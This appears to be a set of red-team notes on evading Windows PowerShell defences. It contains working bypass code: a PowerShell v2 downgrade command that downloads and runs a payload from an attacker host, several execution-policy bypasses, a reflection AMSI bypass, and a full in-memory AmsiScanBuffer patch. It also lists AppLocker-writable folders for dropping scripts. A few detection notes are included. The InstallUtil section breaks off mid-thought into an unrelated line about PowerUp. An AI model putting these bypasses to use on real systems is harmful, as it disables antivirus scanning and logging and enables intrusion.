================================================================================

--- POWERSHELL DEFENSE MECHANISMS ---

SCRIPT BLOCK LOGGING (Event ID 4104):
  Logs ALL executed PowerShell code — even obfuscated, decoded, or dynamically constructed.
  The PowerShell runtime decodes and logs before execution.
  
  Critical: If enabled, attackers cannot evade by obfuscating. The decoded code is logged.
  Enabled via GPO: Computer Configuration → Administrative Templates → Windows Components → PowerShell
  Set "Turn on PowerShell Script Block Logging" → Enabled.
  
  Bypass: PowerShell downgrade to v2 (if installed).
  PowerShell v2 doesn't support script block logging.
  powershell -Version 2 -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
  
  Detection: Event ID 400 with HostVersion showing v2.0. Flag all PS v2 usage.

CONSTRAINED LANGUAGE MODE (CLM):
  Activated by: AppLocker (in audit or enforce mode) or Windows Defender Application Control (WDAC).
  Restricts: .NET method calls, COM objects, certain language elements.
  
  Check current mode:
  $ExecutionContext.SessionState.LanguageMode
  # FullLanguage = unrestricted
  # ConstrainedLanguage = CLM active

EXECUTION POLICY:
  NOT a security boundary. Easy to bypass. Defense in depth only.
  Bypass methods:
  powershell -exec bypass script.ps1
  powershell -ep bypass script.ps1
  Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted
  cat script.ps1 | powershell -  # Pipe bypasses policy
  powershell -c "iex (cat script.ps1 | out-string)"
  Get-Content script.ps1 | Invoke-Expression
  [ScriptBlock]::Create((Get-Content script.ps1)).Invoke()

AMSI (ANTI-MALWARE SCAN INTERFACE):
  Hooks into PowerShell, JScript, VBScript, .NET, Office VBA.
  Sends script content to registered AV engine before execution.
  AV detects malicious: Execution blocked. AMSI_RESULT_DETECTED returned.
  
  Architecture:
  PowerShell.exe → calls AmsiScanBuffer() in amsi.dll → passes to Windows Defender (or other AV).
  amsi.dll: Loaded into PowerShell process. In-process check.
  Bypass: Patch amsi.dll in memory → always return "clean" result.

--- TECHNIQUE 1: REFLECTION-BASED AMSI BYPASS ---

Classic (now heavily detected, use as educational reference):
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

How it works:
  AmsiUtils: Internal PS class managing AMSI state.
  amsiInitFailed: Boolean flag. If true: AMSI considered failed to initialize → skips scanning.
  SetValue($null, $true): Set the field to true via reflection.
  AMSI: Now believes initialization failed. Doesn't scan subsequent commands.
  
  AV detection: The string "amsiInitFailed" and "AmsiUtils" are signatures.
  Obfuscation needed.

--- TECHNIQUE 2: MEMORY PATCH (P/INVOKE) ---

Directly patch AmsiScanBuffer function in memory:
  
  $Win32 = @"
  using System;
  using System.Runtime.InteropServices;
  public class Win32 {
      [DllImport("kernel32")]
      public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
      [DllImport("kernel32")]
      public static extern IntPtr LoadLibrary(string name);
      [DllImport("kernel32")]
      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  }
  "@
  
  Add-Type $Win32
  
  $LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
  $Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
  
  $p = 0
  [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
  
  # Patch bytes: ret instruction (0xC3) — function immediately returns
  $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
  # 0xB8 = mov eax, 0x80070057 (AMSI_RESULT_NOT_DETECTED equivalent error)
  # 0xC3 = ret
  
  [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
  
  # AMSI: AmsiScanBuffer now immediately returns AMSI_RESULT_NOT_DETECTED. Everything passes.

--- APPLOCKER BASICS ---

AppLocker: Whitelist application execution.
  Rules for: Executables (.exe), Scripts (.ps1, .vbs, .bat), DLLs, Installers (.msi, .msp).
  Default rules: Allow %SYSTEM32%\*, %PROGRAMFILES%\*, %WINDIR%\*, signed by Microsoft.
  
  Block: Unknown executables. Scripts from user writeable directories.

DEFAULT WRITEABLE LOCATIONS ALLOWED BY APPLOCKER:
  These directories are often writable by non-admin AND in AppLocker whitelist:
  C:\Windows\Tasks
  C:\Windows\Temp
  C:\Windows\tracing
  C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
  C:\Windows\System32\Tasks
  C:\Windows\SysWOW64\Tasks
  C:\Windows\Registration\CRMLog
  C:\ProgramData\Microsoft\Windows\DeviceMetadataCache
  
  BYPASS: Drop script in these locations → Execute.

APPLOCKER BYPASS: INSTALLUTIL.EXE
  InstallUtil: .NET binary from %WINDIR%\Microsoft.NET\Framework64\.
  Whitelisted (signed Microsoft binary).
  Loads: .NET assembly from specified path. Calls install/uninstall methods.
  
  Malicious .NET DLL with install method containing shellcode:

PowerUp: PowerShell privilege escalation script.
